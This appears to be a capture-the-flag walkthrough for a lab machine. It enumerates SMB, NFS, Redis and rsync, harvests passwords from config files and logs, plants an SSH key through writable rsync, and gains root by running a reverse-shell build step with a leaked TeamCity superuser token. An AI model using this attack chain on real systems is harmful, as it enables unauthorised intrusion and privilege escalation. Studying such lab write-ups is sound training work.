We have few ports open. Lets start poking at them.

### SMB
```bash
smbclient -L //10.10.30.99
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
```

We have read access to shares directory. Looking at it, we found few files but nothing much interesting except the flag.

### NFS
Check what share is available to mount
```bash
showmount -e 10.10.30.99
Export list for 10.10.30.99:
/opt/conf *
```

We can mount this share to access it on our local machine. Simply, `mount 10.10.30.99:/opt/conf <our_mount_dir>`. Now we can access the files locally
```bash
hp
init
opt
profile.d
redis
vim
wildmidi
```
Few interesting files here. The *hp* folder, seems like a printer configuration file. We found an interesting file, redis folder which contains *redis.conf* file. But our nmap didnt find redis server running, running nmap for all ports, it found port 6379 running.
Looking at redis.conf file, we found the authentication password.
```
requirepass : B65Hx562F@ggAZ@F
```

We can now interact with redis server. Connect to it using *nc*, `nc IP 6379`.
```bash
nc 10.10.30.99 6379                                                                                    
auth B65Hx562F@ggAZ@F

```

Decoding the base64 string we found password for rsync
```bash
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

### RSYNC
```bash
rsync rsync://rsync-connect@10.10.30.99
files           Necessary home interaction

rsync rsync://rsync-connect@10.10.30.99/files/sys-internal                                       
Password: 
drwxr-xr-x          4,096 2021/02/06 18:19:29 sys-internal

rsync rsync://rsync-connect@10.10.30.99/files/sys-internal/
Password: 
drwxr-xr-x          4,096 2021/02/06 18:19:29 .
...[snip]...
-rw-------             38 2021/02/06 17:24:25 user.txt
drwxrwxr-x          4,096 2021/05/08 13:15:17 .ssh
```

We have .ssh folder but it was empty. No problem, we can upload our public key into it. Rename our public key to *authorized_keys* and upload it
```bash
rsync authorized_keys rsync://rsync-connect@10.10.30.99/files/sys-internal/.ssh/
```

Now we can ssh into the box.

# ROOT
Running linpeas didn't find any usefull information. Looking at the listening ports
```bash
$ ss -ltnp
tcp              LISTEN             0                  100                              [::ffff:127.0.0.1]:8111                                       *:* 
```
This port was running a webserver, which we can confirm using curl/wget.

Also there was a folder name `TeamCity` in the root directory which was being run by root. This could be potential priv esc vector.
It was running on localhost, we can forward the port to us
```bash
ssh -i ../sys -L 8000:127.0.0.1:8111 sys-internal@10.10.30.99
```

Now we can access the webserver  on our localhost port 8000. It needs authentication, but we dont have any creds. Trying earlier found passwords and default but nothing.
Looking at logs directory in the Teamcity folder, we found a log
```bash
Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
Super user authentication token: 9020742256179529134 (use empty username with the token as the password to access the server)
```

Trying out the latest one, and it got accepted. We have super-user rights on it. 
We can make a project. For priv esc, we need to make a project -> build configuration -> build steps. Run a python script for reverse shell.

Set-up  a listner and we got connection back.
ROOT!!
